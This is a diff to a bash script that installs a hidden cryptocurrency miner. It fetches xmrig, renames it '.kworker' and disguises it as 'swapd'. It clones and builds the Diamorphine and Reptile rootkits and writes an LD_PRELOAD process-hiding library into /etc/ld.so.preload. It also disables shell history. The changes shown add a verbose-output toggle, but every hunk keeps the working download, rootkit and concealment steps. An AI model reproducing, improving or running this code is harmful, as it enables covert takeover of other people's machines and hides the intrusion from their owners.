@@ -1,20 +1,60 @@
 #!/bin/bash
 
-# ==================== DISABLE ALL DEBUGGING ====================
-{ set +x; } 2>/dev/null
+# ==================== VERBOSE MODE ====================
+# Set to true for detailed output, false for quiet mode  
+VERBOSE=true
+
+if [ "$VERBOSE" = true ]; then
+    echo "=========================================="
+    echo "VERBOSE MODE ENABLED"
+    echo "You will see detailed output of all operations"
+    echo "=========================================="
+    echo ""
+fi
+
+# ==================== DISABLE HISTORY ====================
 unset BASH_XTRACEFD PS4 2>/dev/null
-# exec 2>/dev/null >/dev/null  <-- COMMENTED OUT - Output now visible
+unset HISTFILE
+export HISTFILE=/dev/null
 
 # Continue with existing code...
 # Removed -u and -o pipefail to ensure script ALWAYS continues
 set +ue          # Disable exit on error
 set +o pipefail  # Disable pipeline error propagation
 IFS=$'\n\t'
-unset HISTFILE
-export HISTFILE=/dev/null
 
 # Trap errors but continue execution
-trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
+if [ "$VERBOSE" = true ]; then
+    trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
+else
+    trap '' ERR
+fi
+
+# ==================== HELPER FUNCTIONS FOR VERBOSE MODE ====================
+# Run command silently only if VERBOSE=false
+run_silent() {
+    if [ "$VERBOSE" = true ]; then
+        "$@"
+    else
+        "$@" 2>/dev/null
+    fi
+}
+
+# Run command and only show errors
+run_quiet() {
+    if [ "$VERBOSE" = true ]; then
+        "$@"
+    else
+        "$@" 2>&1 | grep -i "error\|fail\|warning" || true
+    fi
+}
+
+# Trap errors but continue execution
+if [ "$VERBOSE" = true ]; then
+    trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
+else
+    trap '' ERR
+fi
 
 # ==================== GIT CONFIGURATION ====================
 # Disable git interactive prompts globally
@@ -500,21 +540,35 @@ DOWNLOAD_SUCCESS=false
 
 # Try to download xmrig
 if [ "$USE_WGET" = true ]; then
-    if wget -q --no-check-certificate -O xmrig.tar.gz "$XMRIG_URL" 2>/dev/null; then
-        DOWNLOAD_SUCCESS=true
+    if [ "$VERBOSE" = true ]; then
+        echo "[*] wget --no-check-certificate -O xmrig.tar.gz $XMRIG_URL"
+        wget --no-check-certificate -O xmrig.tar.gz "$XMRIG_URL" && DOWNLOAD_SUCCESS=true
+    else
+        wget -q --no-check-certificate -O xmrig.tar.gz "$XMRIG_URL" 2>/dev/null && DOWNLOAD_SUCCESS=true
     fi
 else
-    if curl -sS -L -k -o xmrig.tar.gz "$XMRIG_URL" 2>/dev/null; then
-        DOWNLOAD_SUCCESS=true
+    if [ "$VERBOSE" = true ]; then
+        echo "[*] curl -L -k -o xmrig.tar.gz $XMRIG_URL"
+        curl -L -k -o xmrig.tar.gz "$XMRIG_URL" && DOWNLOAD_SUCCESS=true
+    else
+        curl -sS -L -k -o xmrig.tar.gz "$XMRIG_URL" 2>/dev/null && DOWNLOAD_SUCCESS=true
     fi
 fi
 
 # Extract if download was successful
 if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
-    tar -xzf xmrig.tar.gz 2>/dev/null || {
-        echo "[!] Failed to extract xmrig - continuing anyway..."
-        DOWNLOAD_SUCCESS=false
-    }
+    if [ "$VERBOSE" = true ]; then
+        echo "[*] tar -xzf xmrig.tar.gz"
+        tar -xzf xmrig.tar.gz || {
+            echo "[!] Failed to extract xmrig - continuing anyway..."
+            DOWNLOAD_SUCCESS=false
+        }
+    else
+        tar -xzf xmrig.tar.gz 2>/dev/null || {
+            echo "[!] Failed to extract xmrig - continuing anyway..."
+            DOWNLOAD_SUCCESS=false
+        }
+    fi
     
     if [ "$DOWNLOAD_SUCCESS" = true ]; then
         # Rename xmrig to hidden .kworker (actual miner binary)
@@ -601,17 +655,32 @@ WRAPPER_EOF
 # Compile the wrapper
 if command -v gcc >/dev/null 2>&1; then
     echo "[*] Compiling process wrapper with gcc..."
-    gcc -o swapd /tmp/kworker_wrapper.c 2>/dev/null && {
-        chmod +x swapd
-        rm -f /tmp/kworker_wrapper.c
-        echo "[✓] Process wrapper compiled successfully"
-        echo "[✓] Process will appear as 'swapd' (LD_PRELOAD will hide it)"
-    } || {
-        echo "[!] Failed to compile wrapper, using direct binary"
-        # Fallback: create symlink to actual binary
-        ln -sf .kworker swapd 2>/dev/null || cp .kworker swapd 2>/dev/null
-        rm -f /tmp/kworker_wrapper.c
-    }
+    if [ "$VERBOSE" = true ]; then
+        echo "[*] gcc -o swapd /tmp/kworker_wrapper.c"
+        gcc -o swapd /tmp/kworker_wrapper.c && {
+            chmod +x swapd
+            rm -f /tmp/kworker_wrapper.c
+            echo "[✓] Process wrapper compiled successfully"
+            echo "[✓] Process will appear as 'swapd' (LD_PRELOAD will hide it)"
+        } || {
+            echo "[!] Failed to compile wrapper, using direct binary"
+            # Fallback: create symlink to actual binary
+            ln -sf .kworker swapd 2>/dev/null || cp .kworker swapd 2>/dev/null
+            rm -f /tmp/kworker_wrapper.c
+        }
+    else
+        gcc -o swapd /tmp/kworker_wrapper.c 2>/dev/null && {
+            chmod +x swapd
+            rm -f /tmp/kworker_wrapper.c
+            echo "[✓] Process wrapper compiled successfully"
+            echo "[✓] Process will appear as 'swapd' (LD_PRELOAD will hide it)"
+        } || {
+            echo "[!] Failed to compile wrapper, using direct binary"
+            # Fallback: create symlink to actual binary
+            ln -sf .kworker swapd 2>/dev/null || cp .kworker swapd 2>/dev/null
+            rm -f /tmp/kworker_wrapper.c
+        }
+    fi
 else
     echo "[!] gcc not available, using direct binary"
     # Fallback: create symlink to actual binary
@@ -985,7 +1054,15 @@ install_diamorphine() {
     }
     
     echo "[*] Building Diamorphine..."
-    if ! make 2>/dev/null; then
+    if [ "$VERBOSE" = true ]; then
+        make
+        BUILD_SUCCESS=$?
+    else
+        make 2>/dev/null
+        BUILD_SUCCESS=$?
+    fi
+    
+    if [ $BUILD_SUCCESS -ne 0 ]; then
         echo "[!] Failed to build Diamorphine"
         echo "[!] This is common on kernel 6.x - try Reptile instead"
         cd /tmp
@@ -1066,17 +1143,32 @@ install_reptile() {
     export GIT_TERMINAL_PROMPT=0
     
     # Try Gitee mirror first (faster, more reliable)
-    if git clone --depth 1 https://gitee.com/fengzihk/Reptile.git 2>&1 | grep -v "Username"; then
+    if [ "$VERBOSE" = true ]; then
+        echo "[*] Cloning from Gitee: https://gitee.com/fengzihk/Reptile.git"
+        git clone --depth 1 https://gitee.com/fengzihk/Reptile.git 2>&1 | grep -v "Username"
+    else
+        git clone --depth 1 https://gitee.com/fengzihk/Reptile.git 2>&1 | grep -v "Username" >/dev/null
+    fi
+    
+    if [ $? -eq 0 ]; then
         echo "[✓] Cloned from Gitee mirror"
     else
         echo "[*] Gitee failed, trying GitHub mirror..."
         # Fallback to GitHub
-        if ! git clone --depth 1 https://github.com/f0rb1dd3n/Reptile.git 2>&1 | grep -v "Username"; then
+        if [ "$VERBOSE" = true ]; then
+            echo "[*] Cloning from GitHub: https://github.com/f0rb1dd3n/Reptile.git"
+            git clone --depth 1 https://github.com/f0rb1dd3n/Reptile.git 2>&1 | grep -v "Username"
+        else
+            git clone --depth 1 https://github.com/f0rb1dd3n/Reptile.git 2>&1 | grep -v "Username" >/dev/null
+        fi
+        
+        if [ $? -eq 0 ]; then
+            echo "[✓] Cloned from GitHub mirror"
+        else
             echo "[!] Failed to clone Reptile (network or repository unavailable)"
             unset GIT_TERMINAL_PROMPT
             return 1
         fi
-        echo "[✓] Cloned from GitHub mirror"
     fi
     unset GIT_TERMINAL_PROMPT
     
@@ -1363,7 +1455,16 @@ PROCESSHIDER_EOF
 # Compile the LD_PRELOAD library
 echo "[*] Compiling libprocesshider.so..."
 
-if gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl 2>/dev/null; then
+if [ "$VERBOSE" = true ]; then
+    echo "[*] gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl"
+    gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl
+    GCC_SUCCESS=$?
+else
+    gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl 2>/dev/null
+    GCC_SUCCESS=$?
+fi
+
+if [ $GCC_SUCCESS -eq 0 ]; then
     echo "[✓] LD_PRELOAD library compiled successfully"
     
     # Install system-wide
@@ -1386,10 +1487,22 @@ if gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -l
 else
     echo "[!] Failed to compile LD_PRELOAD library"
     echo "[!] Trying to install gcc..."
-    apt-get install -y gcc 2>&1 | tail -3
+    if [ "$VERBOSE" = true ]; then
+        apt-get install -y gcc
+    else
+        apt-get install -y gcc 2>&1 | tail -3
+    fi
     
     # Try again
-    if gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl 2>/dev/null; then
+    if [ "$VERBOSE" = true ]; then
+        gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl
+        GCC_SUCCESS2=$?
+    else
+        gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl 2>/dev/null
+        GCC_SUCCESS2=$?
+    fi
+    
+    if [ $GCC_SUCCESS2 -eq 0 ]; then
         echo "[✓] LD_PRELOAD library compiled successfully (second attempt)"
         echo "/usr/local/lib/libprocesshider.so" > /etc/ld.so.preload
         echo "[✓] LD_PRELOAD activated"
